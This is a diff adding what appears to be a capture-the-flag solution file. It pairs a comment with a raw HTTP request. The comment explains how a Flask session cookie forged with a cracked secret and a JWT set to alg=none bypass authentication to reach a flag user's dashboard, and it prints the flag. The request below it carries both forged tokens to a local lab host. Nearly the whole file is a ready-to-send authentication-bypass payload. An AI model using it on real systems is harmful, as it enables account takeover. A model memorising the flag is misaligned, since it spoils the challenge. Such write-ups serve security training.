@@ -1,0 +1,5 @@
+# Combines forged Flask session (cracked secret 'your_secret_key') with JWT alg=none to access flag user (user_id=10019) dashboard. Flask session forged with flask-unsign, JWT alg changed to none to skip signature check. Flag: flag{795a8930-4d69-4e12-9bf0-d6dad2f990d6}
+
+GET /dashboard HTTP/1.1
+Host: 172.17.0.1:48157
+Cookie: session=eyJ1c2VyX2lkIjoxMDAxOX0.adzflw.9Eqc0Oj3VLFgyWC1EaEqww8_94c; auth_token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImZsYWciLCJ1c2VyX2lkIjoxMDAxOSwidXNlcl90eXBlIjoiY3VzdG9tZXIifQ.
